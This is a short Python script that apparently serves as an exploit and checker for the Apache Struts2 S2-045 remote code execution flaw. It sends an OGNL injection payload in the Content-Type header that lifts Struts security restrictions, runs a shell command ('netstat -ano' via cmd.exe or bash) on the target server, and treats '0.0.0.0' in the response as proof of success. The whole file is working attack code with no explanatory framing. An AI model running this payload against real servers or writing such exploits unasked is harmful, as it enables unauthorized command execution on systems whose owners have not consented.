import requests
import json
# url随意
class struts2_045:
    def __init__(self,url):
        self.url = url

    def attack(self):
        print('test {} --> struts2_045'.format(self.url))
        command = 'netstat -ano'
        headers = {'Content-Type': 'multipart/form-data; boundary=f363ec3cc5ab44708db6a275b1f31a16',"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"}
        headers["Content-Type"] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=' \
                              "+command+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

        data = json.dumps({"image1":self.url})
        try:
            resp = requests.post(self.url,data=data,headers=headers)
            if "0.0.0.0" in resp.text:
                return "struts2_045"
        except requests.ConnectionError as e:
            return None
        return None